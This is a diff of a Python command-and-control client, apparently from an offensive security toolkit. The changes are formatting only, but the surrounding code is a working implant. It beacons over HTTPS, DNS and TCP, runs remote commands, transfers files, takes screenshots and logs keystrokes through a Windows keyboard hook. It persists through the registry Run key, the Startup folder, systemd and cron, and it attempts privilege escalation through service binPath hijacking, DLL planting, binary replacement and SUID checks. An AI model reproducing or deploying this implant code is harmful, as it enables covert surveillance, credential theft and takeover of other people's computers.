@@ -61,9 +61,7 @@ class C2Client(BaseC2):
         default_port = int(c2_url.split(":")[-1].replace("/", "")) if ":" in c2_url else 8888
 
         self.server_host = config.get("server_host", os.environ.get("C2_SERVER_HOST", default_host))
-        self.server_port = config.get(
-            "server_port", int(os.environ.get("C2_SERVER_PORT", str(default_port)))
-        )
+        self.server_port = config.get("server_port", int(os.environ.get("C2_SERVER_PORT", str(default_port))))
         self.protocol = config.get("protocol", "https")
         self.encryption_key = config.get("encryption_key")
         self.client_id = config.get("client_id", self._generate_client_id())
@@ -131,9 +129,7 @@ class C2Client(BaseC2):
             protocols_config.append(
                 {
                     "type": "dns",
-                    "domain": dns_config.get(
-                        "domain", os.environ.get("DNS_DOMAIN", "internal.local")
-                    ),
+                    "domain": dns_config.get("domain", os.environ.get("DNS_DOMAIN", "internal.local")),
                     "dns_server": f"{dns_config.get('host', os.environ.get('C2_DNS_HOST', default_host))}:{dns_config.get('port', int(os.environ.get('C2_DNS_PORT', '53')))}",
                     "priority": 2,
                 }
@@ -149,9 +145,7 @@ class C2Client(BaseC2):
                 {
                     "type": "tcp",
                     "host": tcp_config.get("host", os.environ.get("C2_TCP_HOST", default_host)),
-                    "port": tcp_config.get(
-                        "port", int(os.environ.get("C2_TCP_PORT", str(default_port)))
-                    ),
+                    "port": tcp_config.get("port", int(os.environ.get("C2_TCP_PORT", str(default_port)))),
                     "priority": 3,
                 }
             )
@@ -319,9 +313,7 @@ class C2Client(BaseC2):
 
                 else:
                     consecutive_failures += 1
-                    self.logger.warning(
-                        f"Beacon failed, consecutive failures: {consecutive_failures}"
-                    )
+                    self.logger.warning(f"Beacon failed, consecutive failures: {consecutive_failures}")
 
                     # Attempt protocol failover after multiple failures
                     if consecutive_failures >= self.max_retries:
@@ -450,9 +442,7 @@ class C2Client(BaseC2):
         if task_type == "file_download":
             return await self._download_file(task_data.get("remote_path", ""))
         if task_type == "file_upload":
-            return await self._upload_file(
-                task_data.get("local_path", ""), task_data.get("data", b"")
-            )
+            return await self._upload_file(task_data.get("local_path", ""), task_data.get("data", b""))
         if task_type == "screenshot":
             return await self._take_screenshot()
         if task_type == "keylog_start":
@@ -677,9 +667,7 @@ class C2Client(BaseC2):
                 text=True,
                 timeout=30,
             )
-            return (
-                f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
-            )
+            return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
         except ImportError as e:
             self.logger.error("Import error in c2_client.py: %s", e)
             return "Command execution failed: shlex import error"
@@ -1009,9 +997,7 @@ class C2Client(BaseC2):
 
                                 wintypes.MSG = MSG
                         except (ImportError, AttributeError) as e:
-                            self.logger.error(
-                                "(ImportError, AttributeError) in c2_client.py: %s", e
-                            )
+                            self.logger.error("(ImportError, AttributeError) in c2_client.py: %s", e)
 
                             # Fallback Windows types for cross-platform compatibility
                             class FallbackWintypes:
@@ -1046,20 +1032,13 @@ class C2Client(BaseC2):
                         user32 = ctypes.WinDLL("user32", use_last_error=True)
 
                         # Hook procedure
-                        hookproc = ctypes.WINFUNCTYPE(
-                            ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM
-                        )
+                        hookproc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
 
                         def low_level_keyboard_proc(nCode, wParam, lParam):
                             if nCode == HC_ACTION and wParam == WM_KEYDOWN:
                                 try:
                                     # Get virtual key code
-                                    vk_code = (
-                                        ctypes.cast(
-                                            lParam, ctypes.POINTER(ctypes.c_ulong)
-                                        ).contents.value
-                                        & 0xFFFFFFFF
-                                    )
+                                    vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value & 0xFFFFFFFF
 
                                     # Convert to character if possible
                                     key_char = None
@@ -1243,15 +1222,11 @@ class C2Client(BaseC2):
 
             processes = []
 
-            for proc in psutil.process_iter(
-                ["pid", "name", "username", "cpu_percent", "memory_percent"]
-            ):
+            for proc in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
                 try:
                     processes.append(proc.info)
                 except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
-                    self.logger.error(
-                        "(psutil.NoSuchProcess, psutil.AccessDenied) in c2_client.py: %s", e
-                    )
+                    self.logger.error("(psutil.NoSuchProcess, psutil.AccessDenied) in c2_client.py: %s", e)
 
             return processes
 
@@ -1269,7 +1244,7 @@ class C2Client(BaseC2):
                             check=False,
                             capture_output=True,
                             text=True,
-                            shell=False  # Explicitly secure - using list format prevents shell injection
+                            shell=False,  # Explicitly secure - using list format prevents shell injection
                         )
                         return {"raw_output": result.stdout if result and result.stdout else ""}
                     else:
@@ -1282,7 +1257,7 @@ class C2Client(BaseC2):
                             check=False,
                             capture_output=True,
                             text=True,
-                            shell=False  # Explicitly secure - using list format prevents shell injection
+                            shell=False,  # Explicitly secure - using list format prevents shell injection
                         )
                         return {"raw_output": result.stdout if result and result.stdout else ""}
                     else:
@@ -1460,9 +1435,7 @@ class C2Client(BaseC2):
 
                     try:
                         key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-                        key = winreg.OpenKey(
-                            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
-                        )
+                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                         winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, executable_path)
                         winreg.CloseKey(key)
 
@@ -1491,9 +1464,7 @@ class C2Client(BaseC2):
                 elif method == "startup_folder":
                     # Windows Startup folder persistence
                     try:
-                        startup_path = os.path.expandvars(
-                            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-                        )
+                        startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
                         bat_file = os.path.join(startup_path, f"{service_name}.bat")
 
                         with open(bat_file, "w") as f:
@@ -1596,12 +1567,12 @@ WantedBy=multi-user.target
                             subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                 [systemctl_path, "daemon-reload"],
                                 check=True,
-                                shell=False  # Explicitly secure - using list format prevents shell injection
+                                shell=False,  # Explicitly secure - using list format prevents shell injection
                             )
                             subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                 [systemctl_path, "enable", f"{service_name.lower()}.service"],
                                 check=True,
-                                shell=False  # Explicitly secure - using list format prevents shell injection
+                                shell=False,  # Explicitly secure - using list format prevents shell injection
                             )
 
                         results["success"] = True
@@ -1640,7 +1611,7 @@ WantedBy=multi-user.target
                                 check=False,
                                 capture_output=True,
                                 text=True,
-                                shell=False  # Explicitly secure - using list format prevents shell injection
+                                shell=False,  # Explicitly secure - using list format prevents shell injection
                             )
                             existing_cron = result.stdout if result.returncode == 0 else ""
 
@@ -1651,7 +1622,7 @@ WantedBy=multi-user.target
                                     input=new_cron,
                                     text=True,
                                     check=True,
-                                    shell=False  # Explicitly secure - using list format prevents shell injection
+                                    shell=False,  # Explicitly secure - using list format prevents shell injection
                                 )
 
                         results["success"] = True
@@ -1789,9 +1760,7 @@ WantedBy=multi-user.target
                         if token_result["success"]:
                             results.update(token_result)
                         else:
-                            results["message"] = token_result.get(
-                                "message", "Token impersonation failed"
-                            )
+                            results["message"] = token_result.get("message", "Token impersonation failed")
                     except (
                         OSError,
                         ConnectionError,
@@ -1815,9 +1784,7 @@ WantedBy=multi-user.target
                         if service_result["success"]:
                             results.update(service_result)
                         else:
-                            results["message"] = service_result.get(
-                                "message", "Service exploit failed"
-                            )
+                            results["message"] = service_result.get("message", "Service exploit failed")
                     except (
                         OSError,
                         ConnectionError,
@@ -1891,9 +1858,7 @@ WantedBy=multi-user.target
                         if kernel_result["success"]:
                             results.update(kernel_result)
                         else:
-                            results["message"] = kernel_result.get(
-                                "message", "Kernel exploit failed"
-                            )
+                            results["message"] = kernel_result.get("message", "Kernel exploit failed")
                     except (
                         OSError,
                         ConnectionError,
@@ -2234,7 +2199,7 @@ WantedBy=multi-user.target
 
                 return {
                     "success": False,
-                    "message": f'Checked {len(services.split("SERVICE_NAME:"))-1} services, none exploitable',
+                    "message": f"Checked {len(services.split('SERVICE_NAME:')) - 1} services, none exploitable",
                     "details": {"services_analyzed": len(vulnerable_services)},
                 }
             return {"success": False, "message": "Failed to query services"}
@@ -2313,11 +2278,7 @@ WantedBy=multi-user.target
 
                 # Check for known exploitable SUID binaries
                 exploitable = ["vim", "nano", "less", "more", "nmap"]
-                found_exploitable = [
-                    binary
-                    for binary in suid_binaries
-                    if any(exploit in binary for exploit in exploitable)
-                ]
+                found_exploitable = [binary for binary in suid_binaries if any(exploit in binary for exploit in exploitable)]
 
                 if found_exploitable:
                     return {
@@ -2393,9 +2354,7 @@ WantedBy=multi-user.target
             return {
                 "cpu_percent": psutil.cpu_percent(),
                 "memory_percent": psutil.virtual_memory().percent,
-                "disk_percent": psutil.disk_usage("/").percent
-                if os.name != "nt"
-                else psutil.disk_usage("C:").percent,
+                "disk_percent": psutil.disk_usage("/").percent if os.name != "nt" else psutil.disk_usage("C:").percent,
                 "uptime": time.time() - psutil.boot_time(),
                 "timestamp": time.time(),
             }
@@ -2862,9 +2821,7 @@ WantedBy=multi-user.target
                             # Check if we can write to this location
                             if os.access(injection_dir, os.W_OK):
                                 # Create malicious executable
-                                with tempfile.NamedTemporaryFile(
-                                    suffix=".exe", delete=False
-                                ) as temp_exe:
+                                with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_exe:
                                     # Generate real executable payload
                                     import struct
 
@@ -2908,9 +2865,7 @@ WantedBy=multi-user.target
                                         text=True,
                                     )
 
-                                    self.logger.debug(
-                                        f"Service restart: stop={restart_result.returncode}, start={start_result.returncode}"
-                                    )
+                                    self.logger.debug(f"Service restart: stop={restart_result.returncode}, start={start_result.returncode}")
 
                                     return {
                                         "success": True,
@@ -2952,7 +2907,7 @@ WantedBy=multi-user.target
                 "config",
                 service_name,
                 "binPath=",
-                f'cmd.exe /c echo exploited > {os.path.join(temp_dir, "service_exploit.txt")}',
+                f"cmd.exe /c echo exploited > {os.path.join(temp_dir, 'service_exploit.txt')}",
             ]
             result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
@@ -2965,7 +2920,7 @@ WantedBy=multi-user.target
                         check=False,
                         capture_output=True,
                         text=True,
-                        shell=False  # Explicitly secure - using list format prevents shell injection
+                        shell=False,  # Explicitly secure - using list format prevents shell injection
                     )
 
                 return {
@@ -3014,9 +2969,7 @@ WantedBy=multi-user.target
 
                         if os.access(service_dir, os.W_OK):
                             # Create simple DLL payload
-                            with tempfile.NamedTemporaryFile(
-                                suffix=".dll", delete=False
-                            ) as temp_dll:
+                            with tempfile.NamedTemporaryFile(suffix=".dll", delete=False) as temp_dll:
                                 # Placeholder DLL content
                                 dll_content = b"MZ\\x90\\x00" + b"\\x00" * 1000  # Minimal PE header
                                 temp_dll.write(dll_content)
@@ -3034,13 +2987,13 @@ WantedBy=multi-user.target
                                         [sc_path, "stop", service_name],
                                         check=False,
                                         capture_output=True,
-                                        shell=False  # Explicitly secure - using list format prevents shell injection
+                                        shell=False,  # Explicitly secure - using list format prevents shell injection
                                     )
                                     subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                         [sc_path, "start", service_name],
                                         check=False,
                                         capture_output=True,
-                                        shell=False  # Explicitly secure - using list format prevents shell injection
+                                        shell=False,  # Explicitly secure - using list format prevents shell injection
                                     )
 
                                 return {
@@ -3091,9 +3044,7 @@ WantedBy=multi-user.target
                             shutil.copy2(binary_path, backup_path)
 
                             # Replace with malicious binary
-                            with tempfile.NamedTemporaryFile(
-                                suffix=".exe", delete=False
-                            ) as temp_exe:
+                            with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_exe:
                                 # Simple payload that creates marker file
                                 payload = b"\\x90" * 1000  # Placeholder executable
                                 temp_exe.write(payload)
@@ -3108,23 +3059,21 @@ WantedBy=multi-user.target
                                         [sc_path, "stop", service_name],
                                         check=False,
                                         capture_output=True,
-                                        shell=False  # Explicitly secure - using list format prevents shell injection
+                                        shell=False,  # Explicitly secure - using list format prevents shell injection
                                     )
                                     start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                         [sc_path, "start", service_name],
                                         check=False,
                                         capture_output=True,
                                         text=True,
-                                        shell=False  # Explicitly secure - using list format prevents shell injection
+                                        shell=False,  # Explicitly secure - using list format prevents shell injection
                                     )
                                 else:
                                     stop_result = None
                                     start_result = None
 
                                 if stop_result and start_result:
-                                    self.logger.debug(
-                                        f"Service restart: stop={stop_result.returncode}, start={start_result.returncode}"
-                                    )
+                                    self.logger.debug(f"Service restart: stop={stop_result.returncode}, start={start_result.returncode}")
                                 else:
                                     self.logger.debug("Service restart failed: sc command not found")
 
